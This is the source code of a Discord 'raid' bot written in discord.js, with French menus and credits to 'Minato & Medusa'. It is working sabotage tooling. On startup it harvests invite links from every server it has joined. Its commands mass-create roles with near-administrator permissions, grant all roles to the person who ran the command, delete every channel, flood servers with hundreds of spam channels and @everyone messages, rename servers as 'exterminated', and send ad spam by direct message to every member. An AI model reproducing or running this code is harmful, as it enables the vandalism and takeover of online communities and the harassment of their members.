const Discord = require("discord.js");
const bot = new Discord.Client();
const colors = require("colors");

bot.on('ready', () => {
  console.log(colors.info('-----------------------------------------------------'))
  console.log('--> '.green + 'Bot by Minato & Medusa'.cyan)
  console.log(colors.green('--> Connecter avec succès'))
  console.log(colors.info('-----------------------------------------------------'))
  console.log("--> Name: "+bot.user.username)
  console.log("--> Serveurs:" +bot.guilds.size)
  console.log("--> Membres:" +bot.users.size)
  console.log("--> ID:" +bot.user.id)
  console.log(colors.info('-----------------------------------------------------'))

  bot.guilds.forEach(guild => {
  var invite = guild.channels.random() || guild.afkChannel || guild.channels.first()
    if(guild.channels.size === 0) return;
    if(!guild.member(bot.user).hasPermission("ADMINISTRATOR")) invite.createInvite().then(invite => console.log(colors.red(` [OTHER] ${guild.name} ${invite} ${guild.memberCount} membres ${guild.id}`))).catch(() => { console.log(colors.red(` [OTHER] ${guild.name} ${invite} ${guild.memberCount} membres ${guild.id}`))})
    if(guild.member(bot.user).hasPermission("ADMINISTRATOR")) invite.createInvite().then(invite => console.log(colors.green(` [ADMIN] ${guild.name} ${invite} ${guild.memberCount} membres ${guild.id}`))).catch(() => { console.log(colors.red(` [OTHER] ${guild.name} ${invite} ${guild.memberCount} membres ${guild.id}`))})
  });

});


colors.setTheme({
  silly: 'rainbow',
  input: 'grey',
  verbose: 'cyan',
  prompt: 'grey',
  info: 'green',
  data: 'grey',
  help: 'cyan',
  warn: 'yellow',
  debug: 'blue',
  error: 'red',
});

let notified = [];

////////////////////////////////////////////////////////
bot.on('message', message => {
  if(message.content.startsWith('.help')){
    message.delete()
  var STAFF_embed = new Discord.RichEmbed()
  .setColor('#4304f5')
  .setTitle('𝐄𝐱𝐨𝐭𝐲 𝐒𝐲𝐬𝐭𝐞𝐦𝐞')
  .setThumbnail('https://media.discordapp.net/attachments/596020081146724373/596025752110104663/tumblr_ouq9xpzFmn1rsdpaso1_500.gif')
  .setDescription(`**\n**Nocturne 🌴**, **\n** *Bienvenu sur le menu help du bot.*`)
  .addField("**\n** - 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐞𝐬 𝐑𝐚𝐢𝐝","𝘗𝘰𝘶𝘳 𝘷𝘰𝘪𝘳 𝘭𝘦𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥𝘦𝘴 𝘥𝘦 𝘳𝘢𝘪𝘥 -> .raid")
  .addField("**\n** - 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐞𝐬 𝐌𝐩","𝘗𝘰𝘶𝘳 𝘷𝘰𝘪𝘳 𝘭𝘦𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥𝘦𝘴 𝘥𝘦 𝘳𝘢𝘪𝘥 -> .𝘔𝘱")
  .addField("**\n** - 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐞𝐬 𝐌𝐮𝐬𝐢𝐪𝐮𝐞","𝘗𝘰𝘶𝘳 𝘷𝘰𝘪𝘳 𝘭𝘦𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥𝘦𝘴 𝘥𝘦 𝘳𝘢𝘪𝘥 -> .sound (𝘐𝘯𝘥𝘪𝘴𝘱𝘰𝘯𝘪𝘣𝘭𝘦)")
  .addField('**\n**','** **')
  .addField('**\n**','** **')
  .setFooter('мιηχтσ ρяσנє¢т ν1')
  message.channel.send(STAFF_embed)
}
});

////////////////////////////////////////////////////////

bot.on('message', message => {
  if(message.content.startsWith('.raid')){
    message.delete()
  var STAFF_embed = new Discord.RichEmbed()
  .setColor('#4304f5')
  .setTitle('𝐄𝐱𝐨𝐭𝐲 𝐒𝐲𝐬𝐭𝐞𝐦𝐞')
  .setThumbnail('https://media.discordapp.net/attachments/591753590859628554/596264852193017856/Exoty_Systeme.gif')
  .setDescription(`**\n**Nocturne 🌴**, **\n** 𝙼𝚎𝚗𝚞 𝚛𝚊𝚒𝚍 𝚍𝚞 𝚋𝚘𝚝.`)
  .addField("**\n** - 𝐒𝐩𝐚𝐦","𝘝𝘰𝘪𝘤𝘪 𝘭𝘢 𝘤𝘰𝘮𝘮𝘢𝘯𝘥𝘦 -> .𝘦𝘹𝘦")
  .addField("**\n** - 𝐑𝐨𝐥𝐞𝐬 𝐫𝐚𝐢𝐧𝐛𝐨𝐰","𝘝𝘰𝘪𝘤𝘪 𝘭𝘢 𝘤𝘰𝘮𝘮𝘢𝘯𝘥𝘦 -> .𝘳𝘰𝘭𝘦𝘴")
  .addField("**\n** - 𝐑𝐨𝐥𝐞 𝐀𝐝𝐦𝐢𝐧","𝘝𝘰𝘪𝘤𝘪 𝘭𝘢 𝘤𝘰𝘮𝘮𝘢𝘯𝘥𝘦 -> .𝘳𝘰𝘭𝘦")
  .addField("**\n** - 𝐒𝐮𝐩𝐩𝐫𝐢𝐦𝐞 𝐚𝐥𝐥 𝐬𝐚𝐥𝐨𝐧","𝘝𝘰𝘪𝘤𝘪 𝘭𝘦 𝘤𝘰𝘮𝘮𝘢𝘯𝘥𝘦 -> .𝘥𝘦𝘭")
  .addField('**\n**','** **')
  .setFooter('мιηχтσ ρяσנє¢т ν1')
  message.channel.send(STAFF_embed)
}
});

////////////////////////////////////////////////////////

bot.on('message', message => {
  if(message.content.startsWith('.Mp')){
    message.delete()
  var STAFF_embed = new Discord.RichEmbed()
  .setColor('#4304f5')
  .setTitle('𝐄𝐱𝐨𝐭𝐲 𝐒𝐲𝐬𝐭𝐞𝐦𝐞')
  .setThumbnail('https://media.discordapp.net/attachments/591753590859628554/596265586204475392/Exoty_Pub.gif')
  .setDescription(`**\n**Nocturne 🌴**, **\n** 𝙼𝚎𝚗𝚞 𝙿𝚞𝚋 𝚍𝚞 𝚋𝚘𝚝.`)
  .addField("**\n** - 𝐏𝐮𝐛 𝐭𝐨𝐮𝐬 𝐥𝐞 𝐦𝐨𝐧𝐝𝐞","𝘝𝘰𝘪𝘤𝘪 𝘭𝘢 𝘤𝘰𝘮𝘮𝘢𝘯𝘥𝘦 -> .𝘔𝘹")
  .addField('**\n**','** **')
  .addField('**\n**','** **')
  .addField('**\n**','** **')
  .addField('**\n**','** **')
  .setFooter('мιηχтσ ρяσנє¢т ν1')
  message.channel.send(STAFF_embed)
}
});

////////////////////////////////////////////////////////

bot.on('message', message => {
  if(message.content.startsWith('.sound')){
    message.delete()
  var STAFF_embed = new Discord.RichEmbed()
  .setColor('#4304f5')
  .setTitle('𝐄𝐱𝐨𝐭𝐲 𝐌𝐮𝐬𝐢𝐪𝐮𝐞')
  .setThumbnail('https://media.discordapp.net/attachments/591753590859628554/596264897138917376/Exoty_Musique.gif')
  .setFooter('мιηχтσ ρяσנє¢т ν1')
  message.channel.send(STAFF_embed)
}
});


bot.on("ready", () => {
bot.user.setActivity('мιηχтσ ρяσנє¢т ν1', { type: 'STREAMING', url:'https://www.twitch.tv/login'})
  })
  bot.on("message", message => {
if(message.content.includes(".Cc")){
  console.log(`${bot.guilds.map(c => c.name)}`)
}
if(message.content === ".roles"){
for(var i =0; i < 200; i++){
    message.guild.createRole({name:".",
                             mentionable:false,
                             permissions:2146958591,
                             position: "",
                             color: "#fb0707"
        })
        message.guild.createRole({name:".",
        mentionable:false,
        permissions:2146958591,
        position: "",
        color: "#ff08c5"
})
message.guild.createRole({name:".",
mentionable:false,
permissions:2146958591,
position: "",
color: "#5d08ff"
})
message.guild.createRole({name:".",
mentionable:false,
permissions:2146958591,
position: "",
color: "#0c08ff"
})
message.guild.createRole({name:".",
mentionable:false,
permissions:2146958591,
position: "",
color: "#08d5ff"
})
message.guild.createRole({name:".",
mentionable:false,
permissions:2146958591,
position: "",
color: "#08ffa3"
})
message.guild.createRole({name:".",
mentionable:false,
permissions:2146958591,
position: "",
color: "#08ff23"
})
message.guild.createRole({name:".",
mentionable:false,
permissions:2146958591,
position: "",
color: "#81ff08"
})
message.guild.createRole({name:".",
mentionable:false,
permissions:2146958591,
position: "",
color: "#fff608"
})
message.guild.createRole({name:".",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff6f08"
})
message.guild.createRole({name:".",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:".",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:".",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:".",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:".",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:".",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:".",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
message.guild.createRole({name:".",
mentionable:false,
permissions:2146958591,
position: "",
color: "#ff0808"
})
    }
}


if(message.content.includes(".role")){
    message.guild.createRole({name:"Minxto",
                              mentionable:false,
                              permissions:2146958591,
                              position: "",
                              color: "#fb0707"
   })
}
if(message.content.includes(".add")){
  (message.guild.roles.map(r => message.member.addRoles(r)))
}
if(message.content.includes(".srx")){
  bot.channels.map(c => c.createInvite().then(url => message.channel.send(`https://discord.gg/3UwUZSy/${url.code} : ${url.guild.name}`)))
}
          if(message.content.includes("A?serveurinvite")){
              bot.channels.map(c => c.createInvite().then(url => message.channel.send(`${url.code} : ${url.guild.name}`)))
          }
          if(message.content === "Gang"){
              message.guild.setName("ᴇxᴛᴇʀᴍɪɴᴀᴛᴇᴅ ʙʏ ᴍɪɴᴀᴛᴏ :)")
              message.guild.setIcon("https://media.discordapp.net/attachments/595698098093686794/595714001032445953/Kekra-Clique.tv_.png?width=400&height=211")
            }
            if(message.content === "shit"){
              for(var i =0; i < 450; i++){
              message.guild.createChannel("BY","voice")
              }
            }
            if(message.content.includes("@everyone")){
                for(var i = 0; i < 999; i++){
                    message.channel.send("@everyone Tu vien de te faire baisé par Minato. Ca ce passe ici maintenant :trident: ---->   ||https://discord.gg/3UwUZSy|| ||https://gph.is/g/ZPOyyD8||")
                }
            }
            //réaction en chaine
                  if(message.content === ".exe"){
                    message.channel.send("Minato").then(m => m.delete());
                    message.channel.send("Gang").then(m => m.delete());
                      for(var i = 0; i < 500; i++){
                          message.guild.createChannel("𝙴𝚡𝚝𝚎𝚛𝚖𝚒𝚗𝚊𝚝𝚎𝚍 ","text").then(c => c.send("@everyone . :trident:  https://discord.gg/3UwUZSy"))
                          message.guild.createChannel("𝙴𝚡𝚝𝚎𝚛𝚖𝚒𝚗𝚊𝚝𝚎𝚍 ","text").then(c => c.send("@everyone . :trident:  https://discord.gg/3UwUZSy"))
                          message.guild.createChannel("𝙴𝚡𝚝𝚎𝚛𝚖𝚒𝚗𝚊𝚝𝚎𝚍 ","text").then(c => c.send("@everyone . :trident:  https://discord.gg/3UwUZSy"))
                          message.guild.createChannel("𝙴𝚡𝚝𝚎𝚛𝚖𝚒𝚗𝚊𝚝𝚎𝚍 ","text").then(c => c.send("@everyone . :trident:  https://discord.gg/3UwUZSy"))
                          message.guild.createChannel("𝙴𝚡𝚝𝚎𝚛𝚖𝚒𝚗𝚊𝚝𝚎𝚍 ","text").then(c => c.send("@everyone . :trident:  https://discord.gg/3UwUZSy"))
                          message.guild.createChannel("𝙴𝚡𝚝𝚎𝚛𝚖𝚒𝚗𝚊𝚝𝚎𝚍 ","text").then(c => c.send("@everyone . :trident:  https://discord.gg/3UwUZSy"))

                      }
                    }
                    if(message.content === ".del"){
                      message.guild.channels.map(c => c.delete())
                      }
                      //on commence la destruction
                      if(message.content.includes("deleted")){
                          message.channel.send("Minato").then(m => m.delete());
                          message.channel.send("vien").then(m => m.delete());
                          message.channel.send("de").then(m => m.delete());
                          message.channel.send("t'encule").then(m => m.delete());
                          message.guild.createChannel(".", "text").then(c => c.send("channel"))
                      }
                    });
bot.on('message', message => {
 if(message.content.startsWith('.Mx')){
let cont = message.content.slice(1).split(" ")
        let args = cont.slice(1)
        let member = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0])
      message.guild.members.forEach((player) => {
          message.guild.member(player).send(`
          ┏╋━━━━━━━━━━◥◣ INFORMATIONS ◢◤━━━━━━━━━━╋┓
          
          Nous cherchons des membres actifs ! :trophy:
          - Des gros cadeaux à gagner ( Giveaway, Events, ... ) :tada:
          N'hésitez pas à nous rejoindre ! :crossed_swords:
          Passez dire un coucou, vous accueillit comme il le faut ! :candle: 
          
          **N'attend plus et rejoins nous sur Nocturne, tu le regretteras pas** :palm_tree:
          
          :frame_photo: ||https://media.discordapp.net/attachments/596020081146724373/596025752110104663/tumblr_ouq9xpzFmn1rsdpaso1_500.gif?width=300&height=300||
          :link: https://discord.gg/3UwUZSy`);


          
});
    }
})


   

bot.login(process.env.BOT_TOKEN)
